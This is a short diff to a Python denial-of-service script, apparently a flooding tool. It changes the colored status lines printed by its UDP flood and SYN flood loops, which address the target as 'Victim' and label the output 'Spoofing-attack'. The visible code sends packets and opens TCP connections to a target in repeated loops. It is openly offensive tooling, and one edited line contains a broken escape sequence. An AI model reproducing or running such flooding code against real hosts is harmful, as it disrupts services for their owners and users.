@@ -82,7 +82,7 @@ def udp_flood(ip, port, message, duration):
         try:
             s.sendto(message, target)
             packet_count += 1
-            print(f"\033[48;5;7m\033[38;5;0m {packet_count}  \033[0m \033[38;5;6mVictim port address? \033[38;5;5m" +str(ip)+ " \033[91mSent packet")
+            print(f"\033[48;5;7m\033[38;5;0m {packet_count}  \033[0m \033[38;5;6mVictim port address¿ \033[38;5;5m" +str(ip)+ " \033[91mSent packet")
             print(f"\033[32m[][][][]  \033[33mVictim port address¿ \033[4m" +str(ip)+ "\033[0m \033[38;5;206mSent packet")
         except socket.error:
             # Jika soket tidak dapat mengirim paket, hentikan loop
@@ -109,8 +109,8 @@ def syn_flood(ip, port, duration):
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.connect((ip, port))
             sent += 1
-            print(f"\033[100m\033[97mSYN FL00D\033[0m  \033[32m{sent}  \033[38;5;206m{ip}  \033[90mrunning\033[0m")
-            print(f"\033[38;5;39m I N A R A\033[0m  \033[38;5;206mSYN FL00D\033[0m  \033[97m{sent}\033[0m  \033[103m\033[32m{ip}\033[0m  \033[33mrunning\033[0m")
+            print(f"\033[100m\033[97m SYN FL00D\033[0m \033[32m{sent} \033[38;5;206m{ip} 033[38;5;22mSpoofing-attack")
+            print(f"\033[38;5;39m SYN FL00D\033[0m\033[0m \033[97m{sent} \033[32m{ip} \033[96mSpoofing-attack")
             sock.close()
         except OSError:
             pass
